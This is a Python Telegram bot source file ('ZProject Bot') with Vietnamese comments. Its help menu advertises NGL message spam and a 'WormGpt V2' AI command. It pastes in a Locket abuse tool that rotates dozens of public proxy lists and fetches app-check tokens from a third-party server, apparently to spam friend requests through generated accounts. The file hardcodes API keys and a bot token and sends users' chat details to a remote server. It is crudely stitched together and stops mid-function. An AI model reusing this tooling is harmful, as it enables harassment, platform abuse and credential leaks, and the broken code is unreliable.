import os
import time
import logging
import requests
import re
import base64
import uuid
import json
from datetime import datetime
from io import BytesIO
from PIL import Image # ƒê·∫£m b·∫£o Pillow ƒë∆∞·ª£c c√†i ƒë·∫∑t n·∫øu d√πng ch·ª©c nƒÉng ·∫£nh
import random
import string
import threading # Th√™m import n√†y cho auto_delete_email v√† Locks
from telebot import types
from flask import Flask, request
from threading import Thread
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from types import SimpleNamespace

# --- C·∫•u h√¨nh logging ---
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("bot.log"),
        logging.StreamHandler()
    ]
)

# --- C·∫•u h√¨nh chung ---
# L·∫•y BOT_TOKEN t·ª´ bi·∫øn m√¥i tr∆∞·ªùng, ho·∫∑c d√πng gi√° tr·ªã m·∫∑c ƒë·ªãnh n·∫øu kh√¥ng c√≥ (ch·ªâ ƒë·ªÉ ph√°t tri·ªÉn)
TOKEN = os.environ.get("BOT_TOKEN", "7539540916:AAENFBF2B2dyXLITmEC2ccgLYim2t9vxOQk") # THAY B·∫∞NG TOKEN BOT C·ª¶A B·∫†N
ADMIN_ID = int(os.environ.get("ADMIN_ID", 5819094246)) # THAY B·∫∞NG ID ADMIN C·ª¶A B·∫†N

# ƒê·∫£m b·∫£o APP_URL l√† URL thu·∫ßn t√∫y, kh√¥ng c√≥ Markdown
APP_URL = os.environ.get("APP_URL", "https://zproject-111.onrender.com") # THAY B·∫∞NG URL APP C·ª¶A B·∫†N

logging.info(f"APP_URL ƒë∆∞·ª£c c·∫•u h√¨nh: {APP_URL}")

# THAY ƒê·ªîI QUAN TR·ªåNG: B·∫¨T CH·∫æ ƒê·ªò ƒêA LU·ªíNG
bot = telebot.TeleBot(TOKEN, threaded=True) # <<< ƒê√É CH·ªàNH S·ª¨A ·ªû ƒê√ÇY
app = Flask(__name__)
START_TIME = time.time()

# Bi·∫øn to√†n c·ª•c v√† c√°c Lock ƒë·ªÉ b·∫£o v·ªá truy c·∫≠p ƒëa lu·ªìng
USER_IDS = set()
GROUP_INFOS = []
user_data = {}
bot.feedback_messages = {}
bot.code_snippets = {}
bot.voice_map = {}
bot.mail_messages_state = {}
interaction_count = 0

# Kh·ªüi t·∫°o Locks cho c√°c bi·∫øn d√πng chung
user_data_lock = threading.Lock()
feedback_messages_lock = threading.Lock()
code_snippets_lock = threading.Lock()
voice_map_lock = threading.Lock()
mail_messages_state_lock = threading.Lock() # Th√™m lock cho bot.mail_messages_state
interaction_count_lock = threading.Lock()
user_group_info_lock = threading.Lock()


# --- C·∫•u h√¨nh Requests v·ªõi Retry v√† Timeout chung ---
session = requests.Session()
retries = Retry(total=3, backoff_factor=1, status_forcelist=[502, 503, 504])
adapter = HTTPAdapter(max_retries=retries)
session.mount("https://", adapter)
session.mount("http://", adapter)

DEFAULT_TIMEOUT_GLOBAL = 30 # Timeout m·∫∑c ƒë·ªãnh cho c√°c request kh√°c
NGL_REQUEST_TIMEOUT = 15 # Timeout ri√™ng cho NGL (c√≥ th·ªÉ ƒë·∫∑t ng·∫Øn h∆°n ƒë·ªÉ b·ªè qua nhanh)

# Ghi ƒë√® ph∆∞∆°ng th·ª©c request ƒë·ªÉ √°p d·ª•ng timeout m·∫∑c ƒë·ªãnh, nh∆∞ng NGL s·∫Ω d√πng timeout ri√™ng
class TimeoutSession(requests.Session):
    def request(self, method, url, **kwargs):
        # Apply NGL_REQUEST_TIMEOUT if it's an NGL URL, otherwise use DEFAULT_TIMEOUT_GLOBAL
        if "zeusvr.x10.mx/ngl" in url:
            kwargs.setdefault('timeout', NGL_REQUEST_TIMEOUT)
        else:
            kwargs.setdefault('timeout', DEFAULT_TIMEOUT_GLOBAL)
        return super(TimeoutSession, self).request(method, url, **kwargs)

session = TimeoutSession()
session.mount("https://", adapter)
session.mount("http://", adapter)

# --- C·∫•u h√¨nh Gemini API v√† Prompt t·ª´ xa ---
GEMINI_API_KEY = "AIzaSyDpmTfFibDyskBHwekOADtstWsPUCbIrzE" # THAY B·∫∞NG KH√ìA API GEMINI C·ª¶A B·∫†N
GEMINI_URL = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key={GEMINI_API_KEY}"
REMOTE_PROMPT_URL = "https://zcode.x10.mx/prompt.json"
REMOTE_LOG_HOST = "https://zcode.x10.mx/save.php"

# --- URL ·∫£nh d√πng trong bot ---
NGL_SUCCESS_IMAGE_URL = "https://i.ibb.co/fV1srXJ8/9885878c-2a4b-4246-ae2e-fda17d735e2d.jpg"
START_IMAGE_URL = "https://i.ibb.co/MkQ2pTjv/ca68c4b2-60dc-4eb1-9a20-ebf2cc5c577f.jpg"
NOTI_IMAGE_URL = "https://i.ibb.co/QvrB4zMB/ca68c4b2-2a4b-4246-ae2e-fda17d735e2d.jpg"
TUONGTAC_IMAGE_URL = "https://i.ibb.co/YF4yRCBP/1751301092916.png"

# --- C√°c h√†m Dummy (C·∫ßn thay th·∫ø b·∫±ng logic th·ª±c t·∫ø c·ªßa b·∫°n) ---
def load_user_memory(user_id):
    """T·∫£i l·ªãch s·ª≠ tr√≤ chuy·ªán c·ªßa ng∆∞·ªùi d√πng."""
    # ƒê√¢y l√† h√†m dummy, h√£y thay th·∫ø b·∫±ng logic t·∫£i d·ªØ li·ªáu th·ª±c t·∫ø
    return []

def save_user_memory(user_id, memory):
    """L∆∞u l·ªãch s·ª≠ tr√≤ chuy·ªán c·ªßa ng∆∞·ªùi d√πng."""
    # ƒê√¢y l√† h√†m dummy, h√£y thay th·∫ø b·∫±ng logic l∆∞u d·ªØ li·ªáu th·ª±c t·∫ø
    pass

def html_escape(text):
    """ƒê·ªãnh d·∫°ng vƒÉn b·∫£n th√†nh HTML, tr√°nh l·ªói k√Ω t·ª± ƒë·∫∑c bi·ªát."""
    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;").replace("'", "&#039;")

class gTTS:
    """Class dummy cho gTTS. Thay th·∫ø b·∫±ng th∆∞ vi·ªán gTTS th·ª±c t·∫ø n·∫øu b·∫°n mu·ªën ch·ª©c nƒÉng n√†y ho·∫°t ƒë·ªông."""
    def __init__(self, text, lang="vi", slow=False):
        self.text = text
        self.lang = lang
        self.slow = slow
    def save(self, filename):
        logging.info(f"Dummy gTTS: Saving '{self.text[:50]}...' to {filename}")
        with open(filename, "wb") as f:
            f.write(b"dummy_audio_data")

# --- C√°c h√†m h·ªó tr·ª£ cho ch·ª©c nƒÉng Mail.tm ---

# T·∫°o chu·ªói ng·∫´u nhi√™n
def random_string(length=3):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

# T·ª± ƒë·ªông x√≥a email sau 10 ph√∫t
def auto_delete_email(user_id):
    time.sleep(600)  # 10 ph√∫t
    with user_data_lock: # B·∫£o v·ªá truy c·∫≠p user_data
        if user_id in user_data:
            # TH·ª∞C HI·ªÜN X√ìA T√ÄI KHO·∫¢N TR√äN MAIL.TM N·∫æU C√ì TH·ªÇ
            # V√≠ d·ª• (c·∫ßn l∆∞u account_id v√† token v√†o user_data khi t·∫°o mail):
            # try:
            #     account_info = user_data[user_id]
            #     if 'account_id' in account_info and 'token' in account_info:
            #         headers = {"Authorization": f"Bearer {account_info['token']}"}
            #         session.delete(f"https://api.mail.tm/accounts/{account_info['account_id']}", headers=headers)
            #         logging.info(f"ƒê√£ x√≥a t√†i kho·∫£n Mail.tm: {account_info['email']}")
            # except Exception as e:
            #     logging.error(f"L·ªói khi x√≥a t√†i kho·∫£n Mail.tm cho user {user_id}: {e}")

            del user_data[user_id]
            send_message_robustly(user_id, "‚è∞ Mail 10 ph√∫t c·ªßa b·∫°n ƒë√£ h·∫øt h·∫°n!")

# L·∫•y domain c√≥ s·∫µn t·ª´ API mail.tm
def get_domain():
    # S·ª≠ d·ª•ng session ƒë√£ c·∫•u h√¨nh c·ªßa ZProject bot
    try:
        r = session.get("https://api.mail.tm/domains")
        r.raise_for_status() # Ki·ªÉm tra l·ªói HTTP
        domains = r.json()["hydra:member"]
        # L·ªçc c√°c domain c√≥ isActive = True
        active_domains = [d for d in domains if d.get('isActive', False)]
        if active_domains:
            return random.choice(active_domains)["domain"] # Ch·ªçn ng·∫´u nhi√™n m·ªôt domain
        return None
    except requests.exceptions.RequestException as e: # B·∫Øt l·ªói requests c·ª• th·ªÉ
        logging.error(f"L·ªói khi l·∫•y domain t·ª´ Mail.tm: {e}")
        return None
    except Exception as e: # B·∫Øt c√°c l·ªói kh√°c
        logging.error(f"L·ªói kh√¥ng x√°c ƒë·ªãnh khi l·∫•y domain t·ª´ Mail.tm: {e}")
        return None

# ƒêƒÉng k√Ω v√† l·∫•y token
def create_temp_mail():
    domain = get_domain()
    if not domain:
        return None, None, None

    email = f"zproject_{random_string()}@{domain}"
    password = random_string(12)

    try:
        # T·∫°o t√†i kho·∫£n
        r_acc = session.post("https://api.mail.tm/accounts", json={
            "address": email,
            "password": password
        })
        r_acc.raise_for_status()

        # ƒêƒÉng nh·∫≠p ƒë·ªÉ l·∫•y token
        r_token = session.post("https://api.mail.tm/token", json={
            "address": email,
            "password": password
        })
        r_token.raise_for_status()

        token = r_token.json()['token']
        return email, password, token
    except Exception as e:
        logging.error(f"L·ªói khi t·∫°o/ƒëƒÉng nh·∫≠p mail.tm: {e}")
        return None, None, None

# H√†m x√¢y d·ª±ng c√°c n√∫t cho Mail.tm
def build_mail_buttons(user_id, state):
    markup = InlineKeyboardMarkup()
    # Th√™m user_id v√†o callback_data ƒë·ªÉ ki·ªÉm tra quy·ªÅn
    if state == 'mail_info':
        markup.row(InlineKeyboardButton("üì© Xem H·ªôp Th∆∞", callback_data=f"mailtm_inbox|{user_id}"))
    elif state == 'inbox':
        markup.row(
            InlineKeyboardButton("üîÑ L√†m M·ªõi", callback_data=f"mailtm_refresh|{user_id}"),
            InlineKeyboardButton("‚Ü©Ô∏è Quay L·∫°i", callback_data=f"mailtm_back|{user_id}")
        )
    return markup


# === ƒê·ªìng b·ªô nh√≥m/ng∆∞·ªùi d√πng t·ª´ API ===
def sync_chat_to_server(chat):
    """ƒê·ªìng b·ªô th√¥ng tin chat (ng∆∞·ªùi d√πng/nh√≥m) l√™n server t·ª´ xa."""
    if chat.type not in ["private", "group", "supergroup"]:
        return
    try:
        payload = {
            "id": chat.id,
            "type": chat.type,
            "title": getattr(chat, "title", ""),
            "username": getattr(chat, "username", "")
        }
        response = session.post("https://zcode.x10.mx/apizproject.php", json=payload, timeout=DEFAULT_TIMEOUT_GLOBAL)
        response.raise_for_status()
        logging.info(f"Synced chat {chat.id} to server")
    except Exception as e:
        logging.error(f"Error syncing chat {chat.id}: {e}")

def update_id_list_loop():
    """V√≤ng l·∫∑p ƒë·ªãnh k·ª≥ ƒë·ªÉ c·∫≠p nh·∫≠t danh s√°ch ng∆∞·ªùi d√πng v√† nh√≥m t·ª´ API."""
    global USER_IDS, GROUP_INFOS
    while True:
        try:
            response = session.get("https://zcode.x10.mx/group-idchat.json", timeout=DEFAULT_TIMEOUT_GLOBAL)
            response.raise_for_status()
            data = response.json()
            new_users = set(data.get("users", []))
            new_groups = data.get("groups", [])
            
            with user_group_info_lock: # B·∫£o v·ªá USER_IDS v√† GROUP_INFOS
                if new_users != USER_IDS or new_groups != GROUP_INFOS:
                    USER_IDS = new_users
                    GROUP_INFOS = new_groups
                    logging.info("Updated user and group lists")
        except Exception as e:
            logging.error(f"Error updating lists: {e}")
        time.sleep(10) # ƒê·ª£i 30 gi√¢y tr∆∞·ªõc khi c·∫≠p nh·∫≠t l·∫°i

# Kh·ªüi ch·∫°y lu·ªìng c·∫≠p nh·∫≠t ID
Thread(target=update_id_list_loop, daemon=True).start()

# --- H√†m h·ªó tr·ª£ cho /ask v√† callbacks ---
def build_reply_button(user_id, question, reply_id=None):
    """T·∫°o c√°c n√∫t ph·∫£n h·ªìi cho tin nh·∫Øn /ask."""
    # Gi·ªõi h·∫°n ƒë·ªô d√†i c·ªßa question ƒë·ªÉ tr√°nh l·ªói callback_data qu√° d√†i
    safe_q = (re.sub(r"[^\w\s]", "", question.strip())[:50] + '...') if len(question.strip()) > 50 else question.strip()
    
    markup = InlineKeyboardMarkup()
    buttons = [
        InlineKeyboardButton("üîÅ Tr·∫£ l·ªùi l·∫°i", callback_data=f"retry|{user_id}|{safe_q}")
    ]
    if reply_id:
        buttons.append(InlineKeyboardButton("üîä Chuy·ªÉn sang Voice", callback_data=f"tts|{user_id}|{reply_id}"))
    markup.row(*buttons)
    return markup

# Decorator ƒë·ªÉ tƒÉng interaction_count cho m·ªói l·ªánh
def increment_interaction_count(func):
    def wrapper(message, *args, **kwargs):
        global interaction_count
        with interaction_count_lock: # S·ª≠ d·ª•ng lock
            interaction_count += 1 # TƒÉng s·ªë l∆∞·ª£t t∆∞∆°ng t√°c
        return func(message, *args, **kwargs)
    return wrapper

# H√†m g·ª≠i tin nh·∫Øn c√≥ x·ª≠ l√Ω l·ªói reply_to_message_id
def send_message_robustly(chat_id, text=None, photo=None, caption=None, reply_markup=None, parse_mode="HTML", reply_to_message_id=None, disable_web_page_preview=None):
    try:
        if photo:
            return bot.send_photo(
                chat_id=chat_id,
                photo=photo,
                caption=caption,
                reply_markup=reply_markup,
                parse_mode=parse_mode,
                reply_to_message_id=reply_to_message_id
            )
        else:
            return bot.send_message(
                chat_id=chat_id,
                text=text,
                reply_markup=reply_markup,
                parse_mode=parse_mode,
                reply_to_message_id=reply_to_message_id,
                disable_web_page_preview=disable_web_page_preview
            )
    except telebot.apihelper.ApiTelegramException as e:
        if "message to be replied not found" in str(e):
            logging.warning(f"Failed to reply to message {reply_to_message_id} in chat {chat_id}: {e}. Sending as new message.")
            if photo:
                return bot.send_photo(
                    chat_id=chat_id,
                    photo=photo,
                    caption=caption,
                    reply_markup=reply_markup,
                    parse_mode=parse_mode
                )
            else:
                return bot.send_message(
                    chat_id=chat_id,
                    text=text,
                    reply_markup=reply_markup,
                    parse_mode=parse_mode,
                    disable_web_page_preview=disable_web_page_preview
                )
        else:
            logging.error(f"Error sending message to chat {chat_id}: {e}")
            raise

# === L·ªÜNH X·ª¨ L√ù TIN NH·∫ÆN ===


@bot.message_handler(commands=["start"])
@increment_interaction_count
def start_cmd(message):
    """X·ª≠ l√Ω l·ªánh /start, hi·ªÉn th·ªã th√¥ng tin bot v√† c√°c li√™n k·∫øt."""
    logging.info(f"Received /start from user {message.from_user.id} in chat {message.chat.id}") # Th√™m log
    sync_chat_to_server(message.chat)
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("üë§ Admin", url="https://t.me/zproject2"),
        InlineKeyboardButton("üì¢ Th√¥ng B√°o", url="https://t.me/zproject3"),
        InlineKeyboardButton("üí¨ Chat", url="https://t.me/zproject4")
    )
    send_message_robustly(
        message.chat.id,
        photo=START_IMAGE_URL,
        caption="<b>üöÄ ZProject Bot</b>\n\n"
                "Ch√†o m·ª´ng b·∫°n ƒë·∫øn v·ªõi D·ªãch V·ª• Zproject Bot ƒê∆∞·ª£c Make B·ªüi @zproject2\n "
                "‚óè Ch√∫ng T√¥i C√≥ C√°c D·ªãch V·ª• Nh∆∞ Treo Bot 24/7 Gi√° C·ª±c R·∫ª H∆°n VPS v√† M√°y ·∫¢o \n‚óè B·∫°n C√≥ Th·ªÉ Li√™n H·ªá Telegram @zproject2.\n"
                "--> G√µ /phanhoi ƒê·ªÉ Ph·∫£n H·ªìi L·ªói Ho·∫∑c C·∫ßn C·∫£i Ti·∫øn G√¨ ƒê√≥ Cho Bot, V√≠ D·ª• <code>/phanhoi L·ªói ·ªû L·ªánh Ask 503.</code>\n"
                "--> G√µ /help ƒë·ªÉ xem danh s√°ch c√°c l·ªánh.",
        reply_markup=markup,
        parse_mode="HTML",
        reply_to_message_id=message.message_id
    )

@bot.message_handler(commands=["help"])
@increment_interaction_count
def help_command(message):
    """X·ª≠ l√Ω l·ªánh /help, hi·ªÉn th·ªã menu c√°c l·ªánh."""
    logging.info(f"Received /help from user {message.from_user.id} in chat {message.chat.id}") # Th√™m log
    sync_chat_to_server(message.chat)
    help_text = (
        "<i>üìö Menu L·ªánh ZProject Bot</i>\n\n"
        "‚Ä¢  <code>/start</code> - Start Zproject Bot.\n"
        "‚Ä¢  <code>/help</code>  - Show Menu Zproject Bot.\n"
        "‚Ä¢  <code>/time</code>  - Uptime Zproject Bot.\n"
        "‚Ä¢  <code>/ask &lt;c√¢u h·ªèi&gt;</code> - H·ªèi AI ƒê∆∞·ª£c T√≠ch H·ª£p WormGpt V2.\n"
        "‚Ä¢  <code>/ngl &lt;username&gt; &lt;tin_nh·∫Øn&gt; &lt;s·ªë_l·∫ßn&gt;</code> - Spam Ngl.\n"
        "‚Ä¢  <code>/noti &lt;n·ªôi dung&gt;</code> - <i>(Ch·ªâ Admin)</i> G·ª≠i th√¥ng b√°o.\n"
        "‚Ä¢  <code>/sever</code> - <i>(Ch·ªâ Admin)</i> Sever Bot.\n"
        "‚Ä¢  <code>/tuongtac</code> - Xem t·ªïng s·ªë l∆∞·ª£t t∆∞∆°ng t√°c c·ªßa bot.\n"
        "‚Ä¢  <code>/phanhoi</code> - G·ª≠i Ph·∫£n H·ªìi L·ªói Ho·∫∑c Ch·ª©c NƒÉng C·∫ßn C·∫£i Ti·∫øn.\n"
        "‚Ä¢  <code>/ping</code> - Xem Ping Sever Bot.\n"
        "‚Ä¢  <code>/mail10p</code> - T·∫°o mail 10 ph√∫t d√πng 1 l·∫ßn.\n"
        "‚Ä¢  <code>/hopthu</code> - Xem h·ªôp th∆∞ c·ªßa mail 10 ph√∫t ƒë√£ t·∫°o.\n"
        "‚Ä¢  <code>/xoamail10p</code> - X√≥a mail 10 ph√∫t hi·ªán t·∫°i c·ªßa b·∫°n." # Th√™m l·ªánh m·ªõi
    )
    send_message_robustly(
        chat_id=message.chat.id,
        photo=NGL_SUCCESS_IMAGE_URL,
        caption=help_text,
        parse_mode="HTML",
        reply_to_message_id=message.message_id
    )

import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import sys
import subprocess
import os, re, time, json, queue, string, random, threading, datetime
from queue import Queue
from itertools import cycle
from urllib.parse import urlparse, parse_qs, urlencode
import requests, urllib3
from requests.exceptions import ProxyError
from colorama import init, Back, Style
from typing import Optional, List

# --- C√°c h√†m v√† l·ªõp t·ª´ CTLocket Tool Pro ---
# Vui l√≤ng d√°n to√†n b·ªô c√°c h√†m v√† l·ªõp sau v√†o ƒë√¢y, TR·ª™ ph·∫ßn if __name__ == "__main__": v√† _install_():
# - class xColor
# - class CTLocket (c√≥ ƒëi·ªÅu ch·ªânh nh·ªè ·ªü __init__ v√† _print)
# - C√°c h√†m ngo√†i l·ªõp nh∆∞ _print, _loader_, _sequence_, _randchar_, _blinking_, _rand_str_, _rand_name_, _rand_email_, _rand_pw_, _clear_, typing_print, _matrix_, _banner_, _stats_, load_proxies, init_proxy, format_proxy, get_proxy, excute, step1b_sign_in, step2_finalize_user, step3_send_friend_request, _cd_

# === D√°n to√†n b·ªô code t·ª´ d√≤ng "class xColor:" ƒë·∫øn h·∫øt h√†m "_cd_" v√†o ƒë√¢y ===
class xColor:
    YELLOW='\033[38;2;255;223;15m'
    GREEN='\033[38;2;0;209;35m'
    RED='\033[38;2;255;0;0m'
    BLUE='\033[38;2;0;132;255m'
    PURPLE='\033[38;2;170;0;255m'
    PINK='\033[38;2;255;0;170m'
    MAGENTA='\033[38;2;255;0;255m'
    ORANGE='\033[38;2;255;132;0m'
    CYAN='\033[38;2;0;255;255m'
    PASTEL_YELLOW='\033[38;2;255;255;153m'
    PASTEL_GREEN='\033[38;2;153;255;153m'
    PASTEL_BLUE='\033[38;2;153;204;255m'
    PASTEL_PINK='\033[38;2;255;153;204m'
    PASTEL_PURPLE='\033[38;2;204;153;255m'
    DARK_RED='\033[38;2;139;0;0m'
    DARK_GREEN='\033[38;2;0;100;0m'
    DARK_BLUE='\033[38;2;0;0;139m'
    DARK_PURPLE='\033[38;2;75;0;130m'
    GOLD='\033[38;2;255;215;0m'
    SILVER='\033[38;2;192;192;192m'
    BRONZE='\033[38;2;205;127;50m'
    NEON_GREEN='\033[38;2;57;255;20m'
    NEON_PINK='\033[38;2;255;20;147m'
    NEON_BLUE='\033[38;2;31;81;255m'
    WHITE='\033[38;2;255;255;255m'
    RESET='\033[0m'
class CTLocket:
    def __init__(self, device_token: str="", target_friend_uid: str="", num_threads: int=1, note_target: str=""):
        self.FIREBASE_GMPID="1:641029076083:ios:cc8eb46290d69b234fa606"
        self.IOS_BUNDLE_ID="com.locket.Locket"
        self.API_BASE_URL="https://api.locketcamera.com"
        self.FIREBASE_AUTH_URL="https://www.googleapis.com/identitytoolkit/v3/relyingparty"
        self.FIREBASE_API_KEY="AIzaSyCQngaaXQIfJaH0aS2l7REgIjD7nL431So"
        self.TOKEN_API_URL="http://spyderxapi.x10.mx/locket/v2/api/token.php"
        self.SHORT_URL="https://url.thanhdieu.com/api/v1"
        self.TOKEN_FILE_PATH="token.json"
        self.TOKEN_EXPIRY_TIME=(20 + 10) * 60
        self.FIREBASE_APP_CHECK=None
        self.USE_EMOJI=True
        self.ACCOUNTS_PER_PROXY=random.randint(6,10)
        self.NAME_TOOL="Zproject Bot"
        self.VERSION_TOOL="v1.2"
        self.TARGET_FRIEND_UID=target_friend_uid if target_friend_uid else None
        self.PROXY_LIST = [
    # ===== GitHub Proxy HTTP Raw Links =====
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
    'https://thanhdieu.com/api/list/proxyv3.txt',
    'https://vakhov.github.io/fresh-proxy-list/http.txt',
    'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt',
    'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
    'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
    'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/http.txt',
    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS.txt',
    'https://raw.githubusercontent.com/opsxcq/proxy-list/master/list/http.txt',
    'https://raw.githubusercontent.com/opsxcq/proxy-list/master/list/http_highanon.txt',
    'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
    'https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt',
    'https://raw.githubusercontent.com/almroot/proxylist/main/http.txt',
    'https://raw.githubusercontent.com/hookzof/socks5_list/master/http.txt',
    'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-elite.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/elite.txt',
    'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/https.txt',
    'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt',
    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/http.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/socks4.txt',
    'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt',

    # ===== GitLab Proxy HTTP Raw Links =====
    'https://gitlab.com/roosterkid/openproxylist/-/raw/main/HTTPS.txt',
    'https://gitlab.com/monosans/proxy-list/-/raw/main/http.txt',
    'https://gitlab.com/monosans/proxy-list/-/raw/main/elite.txt',
    'https://gitlab.com/almroot/proxylist/-/raw/main/http.txt',
    'https://gitlab.com/mertguvencli/http-proxy-list/-/raw/main/proxy-list/data.txt',
    'https://gitlab.com/almroot/proxylist/-/raw/main/https.txt',
    'https://gitlab.com/monosans/proxy-list/-/raw/main/https.txt',
    'https://gitlab.com/mertguvencli/http-proxy-list/-/raw/main/proxy-list/https.txt',
    'https://gitlab.com/monosans/proxy-list/-/raw/main/socks4.txt',
    'https://gitlab.com/monosans/proxy-list/-/raw/main/socks5.txt',
]
        self.print_lock=threading.Lock()
        self.successful_requests=0
        self.failed_requests=0
        self.total_proxies=0
        self.start_time=time.time()
        self.spam_confirmed=False
        self.discord='discord.gg/VM7ESrzccs'
        self.author='Nguy·ªÖn Minh Nh·∫≠t'
        self.messages=[]
        self.request_timeout=15
        self.device_token=device_token
        self.num_threads=num_threads
        self.note_target=note_target
        self.session_id=int(time.time() * 1000)
        self._init_environment()
        self.FIREBASE_APP_CHECK=self._load_token_()
        if os.name == "nt":
            os.system(
                f"title üí∞ {self.NAME_TOOL} {self.VERSION_TOOL} by Nguyen Minh Nhat üí∞"
         )
    def _print(self, *args, **kwargs):
        # ƒê√¢y l√† h√†m print n·ªôi b·ªô, c√≥ th·ªÉ b·ªè qua ho·∫∑c ƒëi·ªÅu ch·ªânh ƒë·ªÉ kh√¥ng in ra console n·∫øu ch·ªâ ch·∫°y bot
        # Trong bot Telegram, ch√∫ng ta s·∫Ω g·ª≠i tin nh·∫Øn tr·ª±c ti·∫øp thay v√¨ in
        pass
    def _loader_(self, message, duration=3):
        pass
    def _sequence_(self, message, duration=1.5, char_set="0123456789ABCDEF"):
        pass
    def _randchar_(self, duration=2):
        pass
    def _blinking_(self, text, blinks=3, delay=0.1):
        pass
    def _init_environment(self):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        init(autoreset=True)
    def _load_token_(self):
        try:
            if not os.path.exists(self.TOKEN_FILE_PATH):
                return self.fetch_token()
            # self._loader_( # B·ªè qua loader khi ch·∫°y bot
            #     f"{xColor.YELLOW}Verifying token integrity{Style.RESET_ALL}", 0.5)
            with open(self.TOKEN_FILE_PATH, 'r') as file:
                token_data=json.load(file)
            if 'token' in token_data and 'expiry' in token_data:
                if token_data['expiry'] > time.time():
                    # self._print( # B·ªè qua print khi ch·∫°y bot
                    #     f"{xColor.GREEN}[+] {xColor.CYAN}Loaded token from file token.json: {xColor.YELLOW}{token_data['token'][:10] + "..." + token_data['token'][-10:]}")
                    # time.sleep(0.4)
                    # time_left=int(token_data['expiry'] - time.time())
                    # self._print(
                    #     f"{xColor.GREEN}[+] {xColor.CYAN}Token expires in: {xColor.WHITE}{time_left//60} minutes {time_left % 60} seconds")
                    return token_data['token']
                else:
                    # self._print( # B·ªè qua print khi ch·∫°y bot
                    #     f"{xColor.RED}[!]{xColor.RED} Locket token expired, trying to fetch new token")
                    pass
            return self.fetch_token()
        except Exception as e:
            # self._print( # B·ªè qua print khi ch·∫°y bot
            #     f"{xColor.RED}[!] {xColor.YELLOW}Error loading token from file: {str(e)}")
            return self.fetch_token()
    def save_token(self, token):
        try:
            token_data={
                'token': token,
                'expiry': time.time() + self.TOKEN_EXPIRY_TIME,
                'created_at': time.time()
            }
            with open(self.TOKEN_FILE_PATH, 'w') as file:
                json.dump(token_data, file, indent=4)

            # self._print( # B·ªè qua print khi ch·∫°y bot
            #     f"{xColor.GREEN}[+] {xColor.CYAN}Token saved to {xColor.WHITE}{self.TOKEN_FILE_PATH}")
            return True
        except Exception as e:
            # self._print( # B·ªè qua print khi ch·∫°y bot
            #     f"{xColor.RED}[!] {xColor.YELLOW}Error saving token to file: {str(e)}")
            return False
    def fetch_token(self, retry=0, max_retries=3):
        if retry == 0:
            # self._print( # B·ªè qua print khi ch·∫°y bot
            #     f"{xColor.MAGENTA}[*] {xColor.CYAN}Initializing token authentication sequence")
            # self._loader_("Establishing secure connection", 1)
            pass
        if retry >= max_retries:
            # self._print( # B·ªè qua print khi ch·∫°y bot
            #     f"{xColor.RED}[!] {xColor.YELLOW}Token acquisition failed after {max_retries} attempts")
            # self._loader_("Emergency shutdown", 1)
            # sys.exit(1)
            return None # Tr·∫£ v·ªÅ None ƒë·ªÉ bot x·ª≠ l√Ω
        try:
            # self._print( # B·ªè qua print khi ch·∫°y bot
            #     f"{xColor.MAGENTA}[*] {xColor.CYAN}Preparing to retrieve token [{retry+1}/{max_retries}]")
            response=requests.get(self.TOKEN_API_URL, timeout=self.request_timeout, proxies={
                                    "http": None, "https": None})
            response.raise_for_status()
            data=response.json()
            if not isinstance(data, dict):
                # self._print( # B·ªè qua print khi ch·∫°y bot
                #     f"{xColor.YELLOW}[!] {xColor.WHITE}Invalid response format, retrying...")
                time.sleep(0.5)
                return self.fetch_token(retry + 1)
            if data.get("code") == 200 and "data" in data and "token" in data["data"]:
                token=data["data"]["token"]
                # self._print( # B·ªè qua print khi ch·∫°y bot
                #     f"{xColor.GREEN}[+] {xColor.CYAN}Token acquired successfully")
                # masked_token=token[:10] + "..." + token[-10:]
                # self._print(
                #     f"{xColor.GREEN}[+] {xColor.WHITE}Token: {xColor.YELLOW}{masked_token}")
                self.save_token(token)
                return token
            elif data.get("code") in (403, 404, 502, 503, 504, 429, 500):
                # self._print( # B·ªè qua print khi ch·∫°y bot
                #     f"{xColor.YELLOW}[!] {xColor.RED}The Locket token server is no longer available, please contact us discord @{self.discord}, trying again...")
                time.sleep(1.3)
                return self.fetch_token(retry + 1)
            else:
                # self._print( # B·ªè qua print khi ch·∫°y bot
                #     f"{xColor.YELLOW}[!] {xColor.RED}{data.get("msg")}")
                time.sleep(1.3)
                return self.fetch_token(retry + 1)
        except requests.exceptions.RequestException as e:
            # self._print( # B·ªè qua print khi ch·∫°y bot
            #     f"{xColor.RED}[!] Warning: {xColor.YELLOW}Token unauthorized, retrying... {e}")
